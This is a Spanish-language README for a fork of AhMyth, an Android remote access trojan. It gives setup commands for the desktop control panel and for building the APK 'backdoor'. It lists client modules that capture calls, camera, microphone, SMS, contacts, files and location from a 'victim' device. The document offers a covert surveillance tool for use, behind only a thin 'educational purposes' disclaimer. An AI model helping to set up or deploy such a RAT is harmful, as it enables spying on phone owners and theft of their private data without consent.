# AhMyth Android Rat
###### Beta Version
+ Repositorio original
	+ ```https://github.com/AhMyth/AhMyth-Android-RAT.git```
+ El repositorio actual corrige problemas comunes para su instalación en debian 10, también recopila pull requests aún no aprobado e incorpora nuevas funcionalidades.
	+ ```https://github.com/elcaza/AhMyth-Android-RAT```


Este proyecto consiste de dos partes
* Servidor : Aplicación de escritorio basada en electron framework (control panel)
* Cliente : Aplicación de android (backdoor)


## Primeros pasos
### Hay dos opciones para instalar la aplicación 
#### 1) Desde el código fuente
###### Prerrequisitos :
* Electron (to start the app)
* Java 8 (to generate apk backdoor)
* Electron-builder and electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
1. ```git clone https://github.com/AhMyth/AhMyth-Android-RAT.git```
2. ```cd AhMyth-Android-RAT/AhMyth-Server```
3. ```npm start```

#### 2) Desde los binarios
###### Prerequisite :
* Descargar el binario desde https://github.com/AhMyth/AhMyth-Android-RAT/releases
* Java (to generate apk backdoor)

## Instalación de dependencias y solución a errores comunes
+ Esto fue probado en el siguiente ambiente
	+ Debian 10
	+ javac 8
	+ Node 10
	+ NPM

```
# Instalando dependencias del proyecto
sudo apt install -y nodejs npm git curl libgconf-2-4

# Instalando java 8
sudo apt install -y wget gnupg software-properties-common
wget -qO - https://adoptopenjdk.jfrog.io/adoptopenjdk/api/gpg/key/public | sudo apt-key add -
sudo add-apt-repository --yes https://adoptopenjdk.jfrog.io/adoptopenjdk/deb/
sudo apt update -y
sudo apt install adoptopenjdk-8-hotspot -y

sudo update-alternatives --config java
# Aquí selecciona la que tenga el "8"

git clone https://github.com/elcaza/AhMyth-Android-RAT
cd AhMyth-Android-RAT/AhMyth-Server/
npm install 
npm start
```

## Estructura del proyecto
Web Server
+ app/
	+ app/
		+ assets
			+ css
			+ img
			+ js
				+ controllers 
					+ AppCtrl.js **(App principal)**
					+ LabCtrl.js **(Ventana secundaria de la victicma)**
					+ AppCtrl.js **(Notificaciones emergentes)**
				+ lib **(Librerías)**
				+ model **(Clase victima)**
		+ Factory **(Archivos para la compilación)**
		+ views **(Vistas de cada sección del código)**
		+ files.html
	+ node_modules/ 
	+ main.js **(Archivo main que despliega todo el server)**
	+ package.json 

Cliente
+ main/
	+ java **(Toda la estructura de clases)**
		+ CallManager.java **(Llamadas)**
		+ CameraManager.java **(Cámara)**
		+ ConnectionManager.java **(Sockets)**
		+ ContactsManager.java **(Contactos)**
		+ FileManager.java **(Archivos)**
		+ IOSocket.java **(Sockets)**
		+ LocManager.java **(Localización)**
		+ MainActivity.java **(Main Activity)**
		+ MainService.java **(Main Service)**
		+ MicManager.java **(Micrófono)**
		+ MyReceiver.java **(Sockets)**
		+ SMSManager.java **(Mensajes)**
	+ res 
	+ AndroidManifest.xml


## Screenshots
<p align="center">
	<img src="http://i.imgur.com/HM3uXL6.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
	<img src="http://i.imgur.com/nHTGGHi.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
	<img src="http://i.imgur.com/XVXCHV9.png" width="600"/>
</p>


## Video Tutorial
<p align="center">
<a href="https://www.youtube.com/watch?v=DDIZTABABzs">
	<img src="https://img.youtube.com/vi/DDIZTABABzs/0.jpg" width="600"/>
</a></p>

---------------------------------------------------------------
##### I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.
###### Twitter : <a href="https://twitter.com/AhMythDev"> @AhMythDev </a>
###### Bitcoin address for donations:  : 1EVwLuwmbsEuej7qJnNquFeQJLsgd2b8Lq
